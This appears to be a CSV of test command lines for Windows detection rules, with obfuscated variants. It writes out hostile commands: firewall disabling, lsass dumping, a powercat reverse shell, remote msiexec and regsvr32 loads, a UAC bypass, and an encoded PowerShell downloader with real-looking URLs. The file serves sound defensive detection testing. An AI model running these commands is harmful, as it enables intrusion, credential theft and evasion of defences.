Folder,CommandLine
win_susp_firewall_disable,n"ets"h.exe      ad"vfir"ewall    s"et"   currentprofile  "st"ate "off" 
win_susp_firewall_disable,ne"ts"h.exe   "advfirewall"   s"et"  allprofiles  st"ate" o""ff 
win_susp_firewall_disable,netsh firewall set opmode mode=disable
win_susp_firewall_disable,netsh advfirewall set allprofiles state off
win_susp_firewall_disable,n"et"sh.exe   fi"re"wall   s""et    "opm"ode   "mode"=dis"ab"le
win_susp_firewall_disable,netsh advfirewall set currentprofile state off
win_susp_fsutil_usage,fsutil.exe usn cre"ate"jour""nal C:
win_susp_fsutil_usage,fsutil usn "cre"atejourn"al" C:
win_susp_fsutil_usage,fsutil usn deletejournal /D C:
win_susp_fsutil_usage,fsutil usn createjournal C:
win_susp_fsutil_usage,fsutil usn del"ete"jo""urnal /D C:
win_susp_fsutil_usage,fsutil.exe usn createjournal C:
win_susp_iss_module_install,C:\Windows\System32\inetsrv\"APP"CMD.exe in"sta"ll m"odu"le /"name":ModuleName /image:C:\Path\To\image.dll /add:true
win_susp_iss_module_install,"APPCM"D.exe i"nst"all mo"dul"e -"nam"e:EmanEludom -image:C:\Another\egami.dll -add:true
win_susp_iss_module_install,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:HTTPParser /image:C:\Windows\System32\inetsrv\HTTPParser.dll /add:true
win_susp_iss_module_install,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:EmanEludom /image:C:\Another\egami.dll /add:true
win_susp_iss_module_install,APPCMD.exe install module /name:HTTPParser /image:C:\Windows\System32\inetsrv\HTTPParser.dll /add:true
win_susp_iss_module_install,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:ModuleName /image:C:\Path\To\image.dll /add:true
win_susp_msiexec_web_install,cmd /c "msiexec" /q /I "https://my/malicious.msi"
win_susp_msiexec_web_install,cmd /c msie"x"ec /q /I "https://source/thisisagood.msi"
win_susp_msiexec_web_install,cmd /c msiexec /q /I "https://mal.msi"
win_susp_msiexec_web_install,cmd /c msiexec /q /I "https://source/thisisagood.msi"
win_susp_msiexec_web_install,cmd /c ms"ie"xec /q /I "https://mal.msi"
win_susp_msiexec_web_install,cmd /c msiexec /q /I "https://my/malicious.msi"
win_susp_net_execution,net ""loca"lg"roup Administrators
win_susp_net_execution,net.exe "us"er name
win_susp_net_execution,net a"cc"ounts
win_susp_net_execution,net.exe v"ie"w /all
win_susp_net_execution,net group groupname
win_susp_net_execution,net.exe user name
win_susp_net_execution,net g"rou"p grpname
win_susp_net_execution,net ""u"s"e
win_susp_net_execution,net.exe view /all
win_susp_net_execution,net.exe s"top" "Service"
win_susp_net_execution,net accounts
win_susp_net_execution,C:\Windows\System32\net.exe share 
win_susp_net_execution,net use
win_susp_net_execution,net localgroup Administrators
win_susp_net_execution,net.exe stop "Service"
win_susp_net_execution,C:\Windows\System32\net.exe share
win_susp_netsh_dll_persistence,netsh.exe "ad"d he"lp"er mymal.dll
win_susp_netsh_dll_persistence,C:\Windows\System32\netsh.exe a"d"d h"elp"er C:\Users\username\sus.dll
win_susp_netsh_dll_persistence,netsh add helper C:\path\to\malicious.dll
win_susp_netsh_dll_persistence,C:\Windows\System32\netsh.exe add helper C:\Users\username\sus.dll
win_susp_netsh_dll_persistence,netsh a"dd" "help"er C:\path\to\malicious.dll
win_susp_netsh_dll_persistence,netsh.exe add helper mymal.dll
win_susp_odbcconf,C:\Windows\System32\odbcconf.exe /f another.rsp
win_susp_odbcconf,odbcconf.exe /f nicefile.rsp
win_susp_odbcconf,odbcconf -f file.rsp
win_susp_odbcconf,odbcconf.exe -f file.rsp
win_susp_odbcconf,odbcconf /f file.rsp
win_susp_odbcconf,C:\Windows\System32\odbcconf.exe -f another.rsp
win_susp_ping_hex_ip,ping.exe 0x7f000001
win_susp_ping_hex_ip,C:\Windows\System32\ping.exe   0x7f000001
win_susp_ping_hex_ip,C:\Windows\System32\ping.exe 0x7f000001
win_susp_ping_hex_ip,C:\Windows\System32\ping.exe 0x7f000001
win_susp_ping_hex_ip,C:\Windows\System32\p"in"g.exe "0"x7f000001
win_susp_ping_hex_ip,C:\Windows\System32\ping.exe 0x7f000001
win_susp_powershell_empire_launch,powershell.exe /noP -sta /w 1 -enc C0D3D
win_susp_powershell_empire_launch,powershell.exe -NoP /NonI /W Hidden -Enc ENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -NoP -sta -NonI -W Hidden -""enc SQBENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -NoP -sta -NonI -W Hidden -Enc ENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -NoP -NonI -W Hidden -Enc ENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe /NoP -sta -NonI -W Hidden /Enc ENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -NoP -sta -NonI -W Hidden -enc SQBENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -nop -exec bypass -e SQBENC0D3DC0MM4ND
win_susp_powershell_empire_launch,powershell.exe -noP -sta -w 1 -enc C0D3D
win_susp_powershell_empire_launch,powershell.exe -nop -exec bypass -EncodedCommand SQBENC0D3DC0MM4ND
win_susp_powershell_empire_uac_bypass,powershell.exe /NoP /NonI /W Hidden /c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell /NoP /NonI /W Hidden /enc $x
win_susp_powershell_empire_uac_bypass,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI /W Hidden -enc $x
win_susp_powershell_empire_uac_bypass,powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
win_susp_powershell_empire_uac_bypass,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
win_susp_powershell_empire_uac_bypass,powershell.exe /NoP /NonI /c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell /NoP /NonI /W Hidden /enc $x
win_susp_powershell_empire_uac_bypass,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
win_susp_powershell_enc_cmd,powershell -enc "JABBA"HUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_enc_cmd,powershell -""e    JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_enc_cmd,powershell -e JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_enc_cmd,powershell -e    JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_enc_cmd,powershell -""e JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_enc_cmd,powershell -enc JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle h"id"den -nop -encodedcommand anotherTy5Db21wcmVzc2lvbencoding
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle hid"de"n -nop -encodedcommand encoded1lbW1vdmcommand
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle hidden -nop -encodedcommand  somethingRjaHVua19zaXplencoded
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle hidden -nop -encodedcommand encoded1lbW1vdmcommand
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle hi"dd"en  -nop -encodedcommand somethingRjaHVua19zaXplencoded
win_susp_powershell_hidden_b64_cmd,powershell -WindowStyle hidden -nop -encodedcommand anotherTy5Db21wcmVzc2lvbencoding
win_susp_procdump,procdump ls -ma
win_susp_procdump,procdump /ma ls
win_susp_procdump,procdump -ma lsass
win_susp_procdump,procdump -ma ls
win_susp_procdump,procdump /ma lsass
win_susp_procdump,procdump -ma ls
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c po"wersh"ell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\nothinghere\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c power"she"ll -w hidden -exec bypass cd C:\Users\admin\AppData\Local\secretstuff\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\catchme\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\secretstuff\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c p"ower"shell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\catchme\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_ps_appdata,"C:\Windows\System32\cmd.exe" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\nothinghere\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute 
win_susp_psr_capture_screenshots,psr.exe -start -gui 100 -output C:\Users\User\output.zip
win_susp_psr_capture_screenshots,psr.exe -start /gui 20 /output C:\Users\User\nothingtoseehere.zip
win_susp_psr_capture_screenshots,psr.exe /start /gui 0 /output C:\Users\User\out.zip
win_susp_psr_capture_screenshots,psr.exe /start /gui 20 /output C:\Users\User\nothingtoseehere.zip
win_susp_psr_capture_screenshots,psr.exe -start /gui 0 /output C:\Users\User\out.zip
win_susp_psr_capture_screenshots,psr.exe /start /gui 100 /output C:\Users\User\output.zip
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a -"m"5 -r -inul -"hp"<drowssap> notmalicious.rar thisisfine.exe
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a /"m5" /r /inul /"hp"<mylittlesecret> normal.rar justa.txt
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a -m5 -r -inul -hp<password> example.rar <example>
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a -m5 -r -inul -hp<mylittlesecret> normal.rar justa.txt
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a /m5 /r /inul /hp<password> example.rar <example>
win_susp_rar_flags,C:\Program Files\WinRAR\WinRAR.exe" a -m5 -r -inul -hp<drowssap> notmalicious.rar thisisfine.exe
win_susp_recon_activity,net   localgroup   administrators
win_susp_recon_activity,"net" gr"o"up "enterprise admins" "/dom"ain
win_susp_recon_activity,"ne"t.ex""e   l"oca"lgroup    ad"mini"stra"tor"s
win_susp_recon_activity,net group "domain admins" /domain
win_susp_recon_activity,net group "enterprise admins" /domain
win_susp_recon_activity,net.exe group "domain admins" /domain
win_susp_recon_activity,net localgroup administrators
win_susp_regsvr32_anomalies,regsvr32.exe /n -i:http://something scrobj.dll
win_susp_regsvr32_anomalies,* ..\..\..\Windows\\"Sys"tem32\\"reg"svr32.exe *
win_susp_regsvr32_anomalies,regsvr32 -i Path\To\Temp\\file.dll
win_susp_regsvr32_anomalies,excel ..\..\..\Windows\System32\regsvr32.exe *
win_susp_regsvr32_anomalies,regsvr32 -i Path\To\T"emp"\\file.dll
win_susp_regsvr32_anomalies,regsvr32.exe /n /i:http://something scrobj.dll
win_susp_regsvr32_flags_anomaly,regsvr32 -s -i:UserInstall c:\another\path\to\some.dll
win_susp_regsvr32_flags_anomaly,regsvr32.exe -s -i:UserInstall kasd21.dll
win_susp_regsvr32_flags_anomaly,regsvr32 /s /i:UserInstall c:\path\a.dll
win_susp_regsvr32_flags_anomaly,regsvr32.exe /s /i:UserInstall kasd21.dll
win_susp_regsvr32_flags_anomaly,regsvr32 /s -i:UserInstall c:\path\a.dll
win_susp_regsvr32_flags_anomaly,regsvr32 /s /i:UserInstall c:\another\path\to\some.dll
win_susp_rundll32_activity,C:\Windows\system32\rundll32.exe url.dll ; OpenURLA file://c:\windows\system32\calc.exe
win_susp_rundll32_activity,rundll32.exe "url.dll"   ;   FileProtocolHandler calc.exe
win_susp_rundll32_activity,rundll32 "javascript":"\..\mshtml;RunHTMLApplication ";alert("foo");
win_susp_rundll32_activity,rundll32 "zipfldr.dll"    ; RouteTheCall calc.exe
win_susp_rundll32_activity,rundll32 url.dll; OpenURL file://c:\windows\system32\calc.exe
win_susp_rundll32_activity,rundll32.exe url.dll; FileProtocolHandler calc.exe
win_susp_rundll32_activity,rundll32 "url.dll"; OpenURL file://c:\windows\system32\calc.exe
win_susp_rundll32_activity,rundll32 zipfldr.dll; RouteTheCall calc.exe
win_susp_rundll32_activity,rundll32 javascript:"\..\mshtml;RunHTMLApplication ";alert("foo");
win_susp_rundll32_activity,C:\Windows\System32\rundll32.exe "Shell32.dll"; Control_RunDLL 
win_susp_rundll32_activity,C:\Windows\system32\rundll32.exe url.dll; OpenURLA file://c:\windows\system32\calc.exe
win_susp_rundll32_activity,C:\Windows\System32\rundll32.exe Shell32.dll; Control_RunDLL 
win_susp_rundll32_by_ordinal,C:\Windows\System32\"run"dll32.exe r4nd0m.dll ;#4
win_susp_rundll32_by_ordinal,rundll32 justa.dll ;#2
win_susp_rundll32_by_ordinal,C:\Windows\System32\rundll32.exe susp31.dll ;#1
win_susp_rundll32_by_ordinal,C:\Windows\System32\rundll32.exe justa.dll ;#2
win_susp_rundll32_by_ordinal,rundll32.exe susp31.dll ;#1
win_susp_rundll32_by_ordinal,C:\Windows\System32\rundll32.exe r4nd0m.dll ;#4
win_susp_schtask_creation,schtasks.exe /"create" /sc daily /tn <name> /tr notepad.exe
win_susp_schtask_creation,schtasks.exe -"create" /sc daily /tn mytask /tr powershell.exe
win_susp_schtask_creation,schtasks /create /sc daily /tn <name> /tr cmd.exe
win_susp_schtask_creation,schtasks.exe /create /sc daily /tn mytask /tr powershell.exe
win_susp_schtask_creation,schtasks -create /sc daily /tn <name> /tr cmd.exe
win_susp_schtask_creation,schtasks.exe /create /sc daily /tn <name> /tr notepad.exe
win_susp_script_execution,wscript some."j"se
win_susp_script_execution,C:\Windows\System32\cscript.exe somedir\somefile."v"ba
win_susp_script_execution,wscript.exe C:\Dir\AnotherDir\myfile"."vbe
win_susp_script_execution,cscript C:\Path\To\File.js
win_susp_script_execution,C:\Windows\System32\cscript.exe somedir\somefile.vba
win_susp_script_execution,cscript C:\Another\Path\To\AnotherFile."j"s
win_susp_script_execution,wscript.exe C:\Dir\AnotherDir\myfile.vbe
win_susp_script_execution,wscript some.jse
win_susp_service_path_modification,sc config servicename b"in"Path=cmd.exe
win_susp_service_path_modification,sc.exe co"nf"ig servicename "bin"Path=cmd.exe
win_susp_service_path_modification,sc config servicename binPath=powershell.exe
win_susp_service_path_modification,sc.exe config servicename binPath=cmd.exe
win_susp_service_path_modification,sc co"nfig" servicename binPath=powershell.exe
win_susp_service_path_modification,sc config servicename binPath=cmd.exe
win_susp_squirrel_lolbin,C:\Users\Username\AppData\Local\App\Update.exe -processStartAndWait random.exe
win_susp_squirrel_lolbin,C:\Users\vki\Appdata\Local\Discord\Update.exe /createShortcut C:\Path\To\File.exe -l Desktop
win_susp_squirrel_lolbin,C:\Users\Username\AppData\Local\App\Update.exe --processStart random.exe
win_susp_squirrel_lolbin,C:\Users\vki\Appdata\Local\Discord\Update.exe --createShortcut C:\Path\To\File.exe -l Desktop
win_susp_squirrel_lolbin,C:\Users\Username\AppData\Local\App\Update.exe --process"Start" random.exe
win_susp_squirrel_lolbin,C:\Users\Username\AppData\Local\App\Update.exe --processStartAndWait random.exe
win_susp_svchost_no_cli,sv"cho"st.exe
win_susp_svchost_no_cli,C:\Windows\System32\sv"cho"st
win_susp_svchost_no_cli,svchost.exe
win_susp_svchost_no_cli,C:\Windows\System32\svchost.exe
win_susp_svchost_no_cli,svchost
win_susp_svchost_no_cli,svchost.exe
win_susp_sysprep_appdata,"sysprep.exe" C:\Users\admin\AppData\Local\Temp\gupdate.exe
win_susp_sysprep_appdata,sysprep C:\Users\admin\AppData\Local\Temp\gupdate.exe
win_susp_sysprep_appdata,C:\Windows\system32\sysprep\sysprep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
win_susp_sysprep_appdata,sysprep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
